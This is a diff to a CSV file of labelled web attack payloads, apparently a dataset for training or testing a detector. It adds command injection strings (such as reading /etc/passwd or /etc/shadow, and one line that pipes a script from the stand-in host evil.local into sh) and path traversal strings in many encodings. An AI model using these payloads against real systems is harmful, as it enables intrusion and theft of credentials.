@@ -74,3 +74,53 @@ payload,label
 "{""link"": ""<a href=\""#\"" onmouseover=alert(1)>Hover me</a>""}",XSS
 "{""img"": ""<img src=a onerror=confirm(1)>"", ""alt"": ""image""}",XSS
 "{""marquee"": ""<marquee onstart=alert(1)>Alert XSS</marquee>""}",XSS
+; cat /etc/passwd,CmdI
+| whoami,CmdI
+`id`,CmdI
+$(ls -la),CmdI
+1; uname -a,CmdI
+1 && id,CmdI
+1 || cat /etc/shadow,CmdI
+test; ps aux,CmdI
+test | netstat -an,CmdI
+$(cat /etc/hosts),CmdI
+; echo `whoami`,CmdI
+1; ping -c 3 127.0.0.1,CmdI
+admin && env,CmdI
+laptop; pwd && ls,CmdI
+%0a whoami,CmdI
+%3B%20cat%20%2Fetc%2Fpasswd,CmdI
+1 | head -n 5 /etc/passwd,CmdI
+$(which python3),CmdI
+`uname -r`,CmdI
+1; curl http://evil.local/shell.sh | sh,CmdI
+search & dir C:\Windows\System32,CmdI
+1 && type C:\Windows\win.ini,CmdI
+; sleep 5 #,CmdI
+| grep root /etc/passwd,CmdI
+$(id -un),CmdI
+../../../../etc/passwd,PathTraversal
+../../../etc/shadow,PathTraversal
+..%2f..%2f..%2fetc%2fpasswd,PathTraversal
+....//....//....//etc/passwd,PathTraversal
+%2e%2e/%2e%2e/%2e%2e/etc/passwd,PathTraversal
+..%252f..%252f..%252fetc%252fpasswd,PathTraversal
+..\..\..\..\Windows\win.ini,PathTraversal
+..%5c..%5c..%5cWindows%5csystem.ini,PathTraversal
+/var/www/html/../../etc/passwd,PathTraversal
+../../../../etc/hosts,PathTraversal
+..\/..\/..\/etc/passwd,PathTraversal
+....\/....\/etc/passwd,PathTraversal
+../../../proc/self/environ,PathTraversal
+../../../../var/log/apache2/access.log,PathTraversal
+..%c0%af..%c0%af..%c0%afetc/passwd,PathTraversal
+%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fhosts,PathTraversal
+../../../../config/db.php,PathTraversal
+../config/request_logger.php,PathTraversal
+..;/..;/..;/etc/passwd,PathTraversal
+../../../../boot.ini,PathTraversal
+..%2f..%2f..%2f..%2fWindows%2fwin.ini,PathTraversal
+....//....//config/db.php,PathTraversal
+../../../etc/issue,PathTraversal
+%252e%252e%252f%252e%252e%252fetc%252fpasswd,PathTraversal
+../../../../usr/local/etc/php/php.ini,PathTraversal
